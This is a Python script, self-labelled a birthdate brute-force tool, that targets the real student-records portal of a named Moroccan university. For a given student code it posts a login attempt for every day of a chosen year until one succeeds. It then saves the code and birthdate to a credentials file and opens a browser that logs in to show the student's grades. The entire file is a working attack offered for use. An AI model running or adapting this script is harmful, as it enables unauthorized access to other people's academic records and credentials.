import requests
import urllib3
import os
from datetime import datetime, timedelta
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========= BANNER =========
def banner():
    print("\n" + "=" * 60)
    print("🔥 APOGE BIRTHDATE BRUTEFORCE TOOL".center(60))
    print("💻 Developed for apoweb-te.uae.ac.ma".center(60))
    print("=" * 60 + "\n")

# ========= SAVE CREDENTIALS =========
def save_credentials(apoge_code, birthdate, file_path="credentials.txt"):
    line = f"{apoge_code}:{birthdate}"
    if not os.path.exists(file_path):
        with open(file_path, "w") as f:
            f.write(line + "\n")
        print(f"📁 Created credentials file and saved: {line}")
        return

    with open(file_path, "r") as f:
        lines = [l.strip() for l in f.readlines()]
        if line in lines:
            print("ℹ️  Credentials already saved.")
            return

    with open(file_path, "a") as f:
        f.write(line + "\n")
    print(f"✅ Saved new credentials: {line}")

# ========= AUTO-FILL IN BROWSER AND CLICK BUTTONS =========
def open_browser_and_fill(apoge_code, birthdate):
    print("🌐 Opening browser and logging in...")
    chrome_options = Options()
    chrome_options.add_experimental_option("detach", True)
    service = Service()

    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.get("https://apoweb-te.uae.ac.ma/dossier_etudiant_fs_tetouan/")
    driver.implicitly_wait(5)

    try:
        driver.find_element(By.ID, "typeEmailX-2").send_keys(apoge_code)
        driver.find_element(By.ID, "typePasswordX-2").send_keys(birthdate)
        driver.find_element(By.XPATH, "//button[@type='submit' and @name='submit']").click()
        print("✅ Submitted login form.")

        driver.find_element(By.ID, "l").click()
        print("🖱️ Clicked 'Licence'")

        driver.find_element(By.ID, "bt").click()
        print("🖱️ Clicked 'Afficher'")

    except Exception as e:
        print(f"⚠️ Browser error: {e}")

# ========= ATTEMPT LOGIN REQUEST =========
def try_birthdate(apoge_code, birth_date_str, session):
    url = "https://apoweb-te.uae.ac.ma/dossier_etudiant_fs_tetouan/check.php"
    data = {
        "Login": apoge_code,
        "pass": birth_date_str,
        "submit": ""
    }
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://apoweb-te.uae.ac.ma/dossier_etudiant_fs_tetouan/index.php"
    }

    try:
        response = session.post(
            url,
            data=data,
            headers=headers,
            allow_redirects=False,
            verify=False
        )
        if response.status_code == 302 and "Location" in response.headers:
            if "rechercher_note.php" in response.headers["Location"]:
                return True
    except requests.exceptions.RequestException as e:
        print(f"⚠️  Network error: {e}")
    return False

# ========= TRY ALL DATES IN A YEAR =========
def try_year_range(apoge_code, year, session):
    start_date = datetime.strptime(f"01/01/{year}", "%d/%m/%Y")
    end_date = datetime.strptime(f"31/12/{year}", "%d/%m/%Y")
    current_date = start_date

    while current_date <= end_date:
        birth_str = current_date.strftime("%d/%m/%Y")
        print(f"🔍 Trying {birth_str}", end="\r")

        if try_birthdate(apoge_code, birth_str, session):
            print(f"\n\n✅ SUCCESS ➜ Birthdate found: {birth_str}")
            save_credentials(apoge_code, birth_str)
            open_browser_and_fill(apoge_code, birth_str)
            return True

        current_date += timedelta(days=1)

    print("\n❌ No valid birthdate found for that year.")
    return False

# ========= MAIN MENU =========
def main():
    banner()
    apoge_code = input("🔐 Enter 8-digit Apoge code: ").strip()
    if len(apoge_code) != 8 or not apoge_code.isdigit():
        print("❌ Invalid Apoge code. Must be exactly 8 digits.")
        return

    # 🔎 Check credentials.txt
    if os.path.exists("credentials.txt"):
        with open("credentials.txt", "r") as f:
            creds = dict(line.strip().split(":") for line in f if ":" in line)

        if apoge_code in creds:
            birthdate = creds[apoge_code]
            print(f"🧠 Found saved credentials: {apoge_code}:{birthdate}")
            open_browser_and_fill(apoge_code, birthdate)
            return

    # 🔁 Brute-force if not found
    session = requests.Session()

    while True:
        print("\n" + "-" * 50)
        year = input("📅 Enter birth year to try (or type 'exit' to quit): ").strip()
        if year.lower() == "exit":
            print("\n👋 Exiting tool. Stay sharp.")
            break

        if not year.isdigit() or len(year) != 4:
            print("⚠️  Invalid year. Use format: 2001")
            continue

        print(f"\n>>> Starting bruteforce for year {year}...\n")
        from time import time
        start = time()
        success = try_year_range(apoge_code, year, session)
        duration = time() - start

        print(f"\n⏱️  Done in {round(duration, 2)} seconds.")
        if success:
            break
        else:
            print("➡️  Try a different year.\n")

if __name__ == "__main__":
    main()
